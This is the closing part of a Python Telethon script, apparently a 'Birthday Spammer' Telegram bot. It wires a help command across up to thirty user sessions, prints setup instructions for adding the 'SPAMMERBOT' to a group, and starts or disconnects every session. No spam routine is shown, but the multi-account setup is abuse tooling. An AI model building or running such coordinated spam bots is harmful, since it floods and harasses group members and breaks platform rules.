@str20.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.mahadev"))
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = "**happy birthday futu**\n\n【﻿×××𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀×××】\n\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n.nik\n.pp\n.advik\n.mahadev\n.hyppo\n\n\n.campus\n.pototo\n.mihiku\n.jiya\n.futu\n.yashu\nFor More Help Regarding Usage Of Plugins Type Plugins Name"
       await e.reply(text, parse_mode=None, link_preview=None )

        

    
        
text = """BIRTHDAY SPAMMER"""

print(text)
print("")
print("DONE! **HAPPY BIRTHDAY FUTU** STARTED.\nNOW ADD YOUR SPAMMERBOT IN ONE GROUP THEM TYPE .alive With Sudo Account")
if len(sys.argv) not in (1, 3, 4):
    try:
        str1.disconnect()
    except Exception as e:
        pass
    try:
        str2.disconnect()
    except Exception as e:
        pass
    try:
        str3.disconnect()
    except Exception as e:
        pass
    try:
        str4.disconnect()
    except Exception as e:
        pass
    try:
        str5.disconnect()
    except Exception as e:
        pass
    try:
        str6.disconnect()
    except Exception as e:
        pass
    try:
        str7.disconnect()
    except Exception as e:
        pass
    try:
        str8.disconnect()
    except Exception as e:
        pass
    try:
        str9.disconnect()
    except Exception as e:
        pass
    try:
        str10.disconnect()
    except Exception as e:
        pass
    try:
        str11.disconnect()
    except Exception as e:
        pass
    try:
        str12.disconnect()
    except Exception as e:
        pass
    try:
        str13.disconnect()
    except Exception as e:
        pass
    try:
        str14.disconnect()
    except Exception as e:
        pass
    try:
        str15.disconnect()
    except Exception as e:
        pass
    try:
        str16.disconnect()
    except Exception as e:
        pass
    try:
        str17.disconnect()
    except Exception as e:
        pass
    try:
        str18.disconnect()
    except Exception as e:
        pass
    try:
        str19.disconnect()
    except Exception as e:
        pass
    try:
        str20.disconnect()
    except Exception as e:
        pass
    try:
        str21.disconnect()
    except Exception as e:
        pass
    try:
        str22.disconnect()
    except Exception as e:
        pass
    try:
        str23.disconnect()
    except Exception as e:
        pass
    try:
        str24.disconnect()
    except Exception as e:
        pass
    try:
        str25.disconnect()
    except Exception as e:
        pass
    try:
        str26.disconnect()
    except Exception as e:
        pass
    try:
        str27.disconnect()
    except Exception as e:
        pass
    try:
        str28.disconnect()
    except Exception as e:
        pass
    try:
        str29.disconnect()
    except Exception as e:
        pass
    try:
        str30.disconnect()
    except Exception as e:
        pass
else:
    try:
        str1.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str2.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str3.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str4.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str5.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str6.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str7.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str8.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str9.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str10.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str11.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str12.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str13.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str14.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str15.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str16.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str17.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str18.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str19.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str20.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str21.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str22.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str23.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str24.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str25.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str26.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str27.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str28.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str29.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str30.run_until_disconnected()
    except Exception as e:
        pass

